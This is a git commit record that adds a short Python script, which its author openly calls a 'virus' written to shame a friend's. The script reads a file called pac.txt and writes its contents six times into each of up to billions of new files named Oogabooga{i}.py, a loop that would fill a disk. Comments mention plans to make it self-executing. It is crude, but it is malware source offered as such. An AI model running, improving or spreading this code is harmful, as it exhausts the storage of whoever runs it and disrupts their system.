a1de5cc48d089cb80dbd5ceed427835d7df1f434
Mr. Waltz (Diverse Community) <68202013+MrWaltz-b14@users.noreply.github.com>
2023-03-21 22:26:03 -0400

    Create main.py
    Way better than maleks

---
+++ main.py
@@ -0,0 +1,28 @@
+"""
+Produced by Mr. Waltz
+date: March 21: RAMADAN SOON Boiss!!!
+Disclaimer: dont be a bad boy/girl with this script please. not that its very effective in the first place
+I literally only made this to shame malek for his horrible "Ooga Booga" virus.
+"""
+
+
+# a virus like this should be self executable so add stuff for that later...
+# Make it cooler you stupid nerd!
+#
+# Above are mearly notes for myself, please ignore.
+import os
+import sys
+
+path = "/"
+path2 = "C:"
+f = open("pac.txt", "r")
+the_package = f.read()
+
+for i in range(1,9999999999):
+    with open(f"Oogabooga{i}.py", 'w') as file:
+        file.write(the_package)
+        file.write(the_package)
+        file.write(the_package)
+        file.write(the_package)
+        file.write(the_package)
+        file.write(the_package)
